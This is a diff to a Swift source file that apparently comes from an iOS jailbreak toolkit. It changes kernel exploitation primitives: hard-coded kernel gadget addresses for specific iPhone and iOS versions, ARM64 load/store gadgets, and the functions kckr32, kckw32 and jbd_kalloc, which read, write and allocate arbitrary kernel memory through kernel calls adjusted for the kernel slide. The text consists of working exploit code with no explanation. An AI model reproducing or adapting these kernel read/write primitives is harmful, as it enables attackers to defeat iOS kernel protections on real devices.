@@ -2,23 +2,6 @@
 import Foundation
 
 /*
- 0xFFFFFFF005BDFAF0
- for kr32
- LDR             X0, [X0,#0x90]
- RET
- */
-
-let kckr32_gadget: UInt64 = 0xFFFFFFF005BDFAF0
-let kckw32_gadget: UInt64 = 0xFFFFFFF00733CF2C
-
-/*
- for kw32
- 0xFFFFFFF00733CF2C
- STR             W1, [X0,#0x80]
- RET
- */
-
-/*
  for rk32, no krw
  6s 15.1: 0xfffffff006c9b63c
  7  15.7: 0xfffffff006c6a87c
@@ -45,8 +28,8 @@ let kckw32_gadget: UInt64 = 0xFFFFFFF00733CF2C
 
 
 
-let rk32_static_gadget: UInt64 = 0xfffffff006c6a87c
-let wk32_static_gadget: UInt64 = 0xfffffff0068d8680
+var rk32_static_gadget: UInt64 = 0xfffffff006c6a87c
+var wk32_static_gadget: UInt64 = 0xfffffff0068d8680
 
 @_cdecl("kckw32")
 func kckw32(virt: UInt64, what: UInt32) {
@@ -84,8 +67,8 @@ func kckr32(virt: UInt64) -> UInt32 {
     return UInt32(truncatingIfNeeded: kcall_6_nox0(
         rk32_static_gadget + kernel_slide,
         0, // x0
-        0, // x1: ldr imm
-        virt, // x2: ldr address
+        virt, // x1: ldr imm
+        0, // x2: ldr address
         0, 0, 0
     ))
 }
@@ -110,11 +93,10 @@ func jbd_kcall(_ addr: UInt64, _ x0: UInt64, _ x1: UInt64, _ x2: UInt64, _ x3: U
 var jbd_kernelmap: UInt64 = 0
 
 func jbd_kalloc(_ size: size_t) -> UInt64 {
-    let kernel_map = jbd_kernelmap;
     let VM_KERN_MEMORY_BSD: UInt64 = 2
     
-    let ret = jbd_kcall(wk32_static_gadget + kernel_slide,
-          kernel_map,
+    let ret = jbd_kcall(mach_vm_allocate_kernel_func + kernel_slide,
+          jbd_kernelmap,
           kalloc_scratchbuf,
           UInt64(size),
           UInt64(VM_FLAGS_ANYWHERE),
